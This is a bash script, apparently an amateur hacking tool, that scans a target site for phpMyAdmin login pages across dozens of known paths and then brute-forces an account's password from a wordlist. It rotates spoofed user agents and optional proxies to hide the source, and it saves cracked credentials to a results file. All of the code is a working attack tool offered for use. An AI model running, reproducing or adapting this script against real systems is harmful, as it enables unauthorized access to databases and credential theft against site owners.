#!/bin/bash
# PhpMyAdmin Bruteforcer Script
# By Hood3dRob1n
#

# Variables:
JUNK=/tmp
STORAGE1=$(mktemp -p "$JUNK" -t fooooobar1.tmp.XXX)
STORAGE2=$(mktemp -p "$JUNK" -t fooooobar2.tmp.XXX)
uagent1="Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
uagent2="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1"
uagent3="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"
uagent4="Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0"
PMALIST="/phpMyAdmin/
/phpmyadmin/
/PMA/
/admin/
/dbadmin/
/mysql/
/myadmin/
/phpmyadmin2/
/phpMyAdmin2/
/phpMyAdmin-2/
/php-my-admin/
/phpMyAdmin-2.2.3/
/phpMyAdmin-2.2.6/
/phpMyAdmin-2.5.1/
/phpMyAdmin-2.5.4/
/phpMyAdmin-2.5.5-rc1/
/phpMyAdmin-2.5.5-rc2/
/phpMyAdmin-2.5.5/
/phpMyAdmin-2.5.5-pl1/
/phpMyAdmin-2.5.6-rc1/
/phpMyAdmin-2.5.6-rc2/
/phpMyAdmin-2.5.6/
/phpMyAdmin-2.5.7/
/phpMyAdmin-2.5.7-pl1/
/phpMyAdmin-2.6.0-alpha/
/phpMyAdmin-2.6.0-alpha2/
/phpMyAdmin-2.6.0-beta1/
/phpMyAdmin-2.6.0-beta2/
/phpMyAdmin-2.6.0-rc1/
/phpMyAdmin-2.6.0-rc2/
/phpMyAdmin-2.6.0-rc3/
/phpMyAdmin-2.6.0/
/phpMyAdmin-2.6.0-pl1/
/phpMyAdmin-2.6.0-pl2/
/phpMyAdmin-2.6.0-pl3/
/phpMyAdmin-2.6.1-rc1/
/phpMyAdmin-2.6.1-rc2/
/phpMyAdmin-2.6.1/
/phpMyAdmin-2.6.1-pl1/
/phpMyAdmin-2.6.1-pl2/
/phpMyAdmin-2.6.1-pl3/
/phpMyAdmin-2.6.2-rc1/
/phpMyAdmin-2.6.2-beta1/
/phpMyAdmin-2.6.2-rc1/
/phpMyAdmin-2.6.2/
/phpMyAdmin-2.6.2-pl1/
/phpMyAdmin-2.6.3/
/phpMyAdmin-2.6.3-rc1/
/phpMyAdmin-2.6.3/
/phpMyAdmin-2.6.3-pl1/
/phpMyAdmin-2.6.4-rc1/
/phpMyAdmin-2.6.4-pl1/
/phpMyAdmin-2.6.4-pl2/
/phpMyAdmin-2.6.4-pl3/
/phpMyAdmin-2.6.4-pl4/
/phpMyAdmin-2.6.4/
/phpMyAdmin-2.7.0-beta1/
/phpMyAdmin-2.7.0-rc1/
/phpMyAdmin-2.7.0-pl1/
/phpMyAdmin-2.7.0-pl2/
/phpMyAdmin-2.7.0/
/phpMyAdmin-2.8.0-beta1/
/phpMyAdmin-2.8.0-rc1/
/phpMyAdmin-2.8.0-rc2/
/phpMyAdmin-2.8.0/
/phpMyAdmin-2.8.0.1/
/phpMyAdmin-2.8.0.2/
/phpMyAdmin-2.8.0.3/
/phpMyAdmin-2.8.0.4/
/phpMyAdmin-2.8.1-rc1/
/phpMyAdmin-2.8.1/
/phpMyAdmin-2.8.2/
/sqlmanager/
/mysqlmanager/
/p/m/a/
/PMA2005/
/pma2005/
/phpmanager/
/php-myadmin/
/phpmy-admin/
/webadmin/
/sqlweb/
/websql/
/webdb/
/mysqladmin/
/mysql-admin/";
#First a simple Bashtrap function to handle interupt (CTRL+C)
trap bashtrap INT

function bashtrap(){
	echo
	echo
	echo 'CTRL+C has been detected!.....shutting down now' | grep --color '.....shutting down now'
	#Kill any running instances in case we ran large file and spawned background processes...
	ps aux | grep "$0" | cut -d' ' -f6 | while read selfkill
	do
		kill -9 "$selfkill" 2> /dev/null
	done
	rm -f "$STORAGE1"
	rm -f "$STORAGE2"
	#exit entire script if called
	exit 0
}
#End bashtrap()



function usage(){
	echo
	echo "HR's PhpMyAdmin Finder and Bruterforcer Script" | grep --color -E 'HR||s PhpMyAdmin Finder and Bruterforcer Script'
	echo "Simply run and follow the prompts dummy :p" | grep --color 'Simply run and follow the prompts dummy'
	echo
	exit;
}
#End usage


function pma_finder(){
	echo
	echo "Please provide site to scan for PhpMyAdmin page:" | grep --color 'Please provide site to scan for PhpMyAdmin page'
	read PMASITE
	echo
	echo "Do you want to use a proxy? (y/n)" | grep --color -E 'Do you want to use a proxy||y||n'
	read PROXDEC
	if [ "$PROXDEC" == y ] || [ "$PROXDEC" == Y ] || [ "$PROXDEC" == yes ] || [ "$PROXDEC" == YES ]; then
		echo
		echo "OK, please provide proxy to use in IP:PORT format:" | grep --color -E 'OK||please provide proxy to use in IP||PORT format'
		read PROXYADDY
		echo
		METH=2
	else
		echo "OK, just checking...." | grep --color -E 'OK||just checking'
		echo
	fi
	echo "OK, checking $PMASITE for PhpMyAdmin page....." | grep --color -E "OK||checking $PMASITE for PhpMyAdmin page"
	echo
	echo "${PMALIST[@]}" | while read pmaloc
	do
		TARGETSITE="$PMASITE$pmaloc"
		if [ "$METH" == 2 ]; then
			curl $TARGETSITE -I -x "$PROXYADDY" -A "$uagent2" -e "localhost" -o "$STORAGE1" 2> /dev/null
		else
			curl $TARGETSITE -I -A "$uagent1" -e "localhost" -o "$STORAGE1" 2> /dev/null
		fi
		cat "$STORAGE1" | sed '2,20d' | cut -d' ' -f2 > "$STORAGE2" 2> /dev/null
		cat "$STORAGE2" | while read pageused
		do
			if [ "$pageused" == '200' ]; then
				echo "[ 200 SUCCESS ] $TARGETSITE" | grep --color '\[ 200 SUCCESS \]'
			elif [ "$pageused" == '302' ]; then
				echo "[ 302 Redirect ] $TARGETSITE" | grep --color '\[ 302 Redirect \]'
			elif [ "$pageused" == '403' ]; then
				echo "[ 403 Forbidden ] $TARGETSITE" | grep --color '\[ 403 Forbidden \]'
			fi
		done
	done
	decision_tree
}
# End pma_finder



function pma_bruteforcer(){
	echo
	echo "Please provide site and path to PhpMyAdmin page you want to bruteforce:" | grep --color 'Please provide site and path to PhpMyAdmin page you want to bruteforce'
	read PMABRUTE
	echo
	echo "Please provide username to bruteforce:" | grep --color 'Please provide username to bruteforce'
	read USER
	echo
	echo "Please provide path to wordlist to use:" | grep --color 'Please provide path to wordlist to use'
	read WORDLIST
	if [ ! -r "$WORDLIST" ]; then
		echo "Can't read provided wordlist, please try again!"
		pma_bruteforcer
	fi
	echo "Do you want to use a proxy? (y/n)" | grep --color -E 'Do you want to use a proxy||y||n'
	read PROXDEC
	if [ "$PROXDEC" == y ] || [ "$PROXDEC" == Y ] || [ "$PROXDEC" == yes ] || [ "$PROXDEC" == YES ]; then
		echo
		echo "OK, please provide proxy to use in IP:PORT format:" | grep --color -E 'OK||please provide proxy to use in IP||PORT format'
		read PROXYADDY
		echo
		METH=2
	else
		echo "OK, just checking...." | grep --color -E 'OK||just checking'
		echo
	fi
	echo
	echo "OK, preparing to bruteforce $USER account at $PMABRUTEw with this wordlist: $WORDLIST...." | grep --color -E "OK||preparing to bruteforce $USER account at $PMABRUTEw with this wordlist||$WORDLIST"
	echo
	COUNT=1
	cat $WORDLIST | sort | uniq | while read PASS
	do
		DATA="pma_username=$USER&pma_password=$PASS&server=1&lang=en-utf-8&convcharset=iso-8859-1"
		UA="\$uagent$COUNT"
		if [ "$METH" == 2 ]; then
			curl "$PMABRUTE" --data "$DATA" -x "$PROXYADDY" -L -c "$STORAGE2" --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "localhost" -A "$UA" > "$STORAGE1" 2> /dev/null
		else
			curl "$PMABRUTE" --data "$DATA" -L -c "$STORAGE2" --retry 2 --retry-delay 3 --connect-timeout 3 --no-keepalive -s -e "localhost" -A "$UA" > "$STORAGE1" 2> /dev/null
		fi
		grep 'Access denied' "$STORAGE1" 2> /dev/null > /dev/null
		if [ "$?" == 0 ]; then
			echo "[BAD] $USER:$PASS"
		else
			echo "[SUCCESS] $USER:$PASS" | grep --color "\[SUCCESS\] $USER:$PASS"
			echo "[SUCCESS] $USER:$PASS on $PMABRUTE" >> pma_results.txt
		fi
		COUNT=$((COUNT +1))
		if [ "$COUNT" == 4 ]; then
			COUNT=1
		fi
	done
	decision_tree
}
#End pma_bruteforcer



# Decision Tree
function decision_tree(){
echo
echo "Please select which option you would like to use: " | grep --color -E 'Please select which option you would like to use'
select pma_options in "PMA Finder" "PMA Bruteforcer" "Exit"
do
	case $pma_options in
		"PMA Finder")
			pma_finder
		;;
		"PMA Bruteforcer")
			pma_bruteforcer
		;;
		"Exit")
			exit 0;
		;;
		*)
			echo "Input not understood, please try again...." | grep --color -E 'Input not understood||please try again'
			usage
		;;
	esac
done
}
#End Decision Tree




#MAIN---------------------------------------------------------------
clear
#Check to ensure arguments passed or provide usage info for dummies
if [ "$1" == '-h' ] || [ "$1" == '--help' ]; then
	usage
fi
decision_tree
rm -f "$STORAGE1"
rm -f "$STORAGE2"
#EOF
